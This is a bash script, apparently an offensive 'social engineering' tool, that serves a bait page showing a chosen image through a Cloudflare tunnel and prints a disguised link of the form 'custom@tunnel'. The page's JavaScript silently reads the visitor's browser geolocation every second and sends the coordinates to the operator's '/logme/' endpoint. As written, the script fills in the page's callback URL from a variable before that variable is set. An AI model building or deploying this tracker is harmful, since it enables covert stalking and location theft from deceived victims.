#!/bin/bash
#coded by  0xbit
GREEN="$(printf '\033[32m')"
clear

banner() {
	cat <<- EOF
	
	${GREEN}  ██████████   ██████████ ██████████       █████████  ██████████   █████████ 
	${GREEN}░░███░░░░███ ░░███░░░░░█░░███░░░░███     ███░░░░░███░░███░░░░░█  ███░░░░░███
	${GREEN} ░███   ░░███ ░███  █ ░  ░███   ░░███   ░███    ░░░  ░███  █ ░  ███     ░░░ 
	${GREEN} ░███  LOCATE SOMEONE LOCATION USING SOCIAL ENGINEERING TOOL CODED BY 0XBIT         
	${GREEN} ░███    ░███ ░███░░█    ░███    ░███    ░░░░░░░░███ ░███░░█   ░███   V.1      
	${GREEN} ░███    ███  ░using image███    ███     ███    ░███ ░███ ░   █░░███     ███
	${GREEN}  ██████████   ██████████ ██████████     ░░█████████  ██████████ ░░█████████ 
	${GREEN} ░░░░░░░░░░   ░░░░░░░░░░ ░░░░░░░░░░       ░░░░░░░░░  ░░░░░░░░░░   ░░░░░░░░░  
	EOF
}

banner

killall php > /dev/null 2>&1 &
killall cloudflared > /dev/null 2>&1 &
rm .link.log > /dev/null 2>&1 &
sleep 1
./cloudflared tunnel -url 127.0.0.1:8080 --logfile .link.log > /dev/null 2>&1 &
echo ''
echo '[*] Example: https://www.clearwallpaper.com/wp-content/uploads/2021/03/dedsec-wallpaper-001-768x432.png [*]'
read -p $'[-] Image link: ' pic
read -p $'[-] Page title: ' title
echo "<!DOCTYPE html>
<html>
    <head>
        <title>$title</title>
        <style type=\"text/css\">
            
            body {
            background-image: url(\"$pic\");
                background-size: 1650px 1150px;
                background-repeat: no-repeat;
            }
        </style>
    </head>
    <body>
        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }
        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$link"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });
        </script>
    </body>
</html>" > index.html
echo ''
echo -e '[*] Generating Page... [*]'
sleep 2
echo -e '[*] Generating Page... [*]'
sleep 2
echo -e '[*] Generating Page... [*]'
sleep 2
echo -e '[*] Generating Page... [*]'
sleep 2
echo -e '[*] Generating Page... [*]'
echo ''
sleep 2
clear
banner
echo ''
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log")
link1=${link#https://}
echo '[*] CREATE CUSTOM LINK [*]'
echo -e "[*] Example: https://dedsec_group.com [*]"
read -p $'[*] Custom link: ' mask
echo -e "\n [-]URL 1 : $link"
echo -e "\n [-]URL 2 : $mask@$link1"
echo -e ''
echo -e "[-] WAIT FOR THE LOCATION / EXAMPLE : 19.5454,343.2121 [-]"
php -S 127.0.0.1:8080
